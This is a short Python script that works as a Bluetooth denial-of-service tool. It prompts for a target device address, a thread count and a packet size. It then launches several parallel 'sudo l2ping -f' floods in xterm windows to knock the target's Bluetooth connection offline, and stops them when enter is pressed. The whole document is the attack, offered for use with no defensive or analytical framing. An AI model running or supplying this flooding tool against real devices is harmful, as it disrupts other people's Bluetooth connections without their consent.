#About: Script that uses l2ping to flood a device to interupt their bluetooth connection.
#Version: 2.0
#Date: 11-02-2024
import os
import subprocess
import concurrent.futures

active = True

def clear():
     os.system('clear')
     print('l2ping Bluetooth DOS')
     return
     

def worker(address, packet_size):
        process = subprocess.Popen(["xterm", "-e","sudo l2ping -s " + packet_size + " -f " + address])
        return process

def attack(address, threadnum, packet_size):
    processes = []
    threadnum = int(threadnum)
    print("Creating threads and subprocesses:")
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for i in range(threadnum):
            print(f"Creating thread #{i + 1}")
            future = executor.submit(worker, address, packet_size)
            print(f"Creating process #{i + 1}")
            process = future.result()
            processes.append(process)
        print("Attack underway...")
    return processes

def main():

    global active

    clear()
    address = input("What is the target adress? ")
    threadnum = input("How many threads would you like to use? ")
    packet_size = input("What size packets would you like to send? ")

    clear()
    print()
    processes = attack(address, threadnum, packet_size)
    print()
    input("Press enter to stop attack.")
    for process in processes:
         process.terminate()

    clear()
    print()
    print("Attack completed.")
    input("Press enter to quit...")
    return

main()